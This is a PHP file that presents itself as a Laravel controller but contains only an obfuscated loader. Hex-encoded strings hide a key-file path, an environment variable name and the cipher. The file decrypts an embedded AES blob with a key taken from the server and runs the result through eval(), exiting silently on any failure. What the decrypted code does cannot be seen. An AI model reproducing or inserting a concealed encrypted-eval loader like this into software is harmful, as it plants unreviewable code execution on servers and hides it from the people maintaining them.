<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('E0opNzU/aEtsnY3//Fukbg==');

$c=base64_decode(

'93hs95DmIztuoR2kwVEhzKHVCrxVeGVye2KuotfpPz2fyEB6yeo+B3cHF5oG8zhElqCv3AAukmK7' .
'kHKx+22poP31fKVoP/ZV7imqka3r1fgpwEX4///qslEqScR0BJuYsu6kSjTeAoxYBp6qsHYoR20U' .
'3xlGkOrNGCWjMPg06NH1NPWyMqlv/1+zBMyJsfxP4pauesW2xjHH1ubWLwLZgIxEwpyHEk66cXyl' .
'g4tS8PkKwW3AswEjpSQksQh/ON/7'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

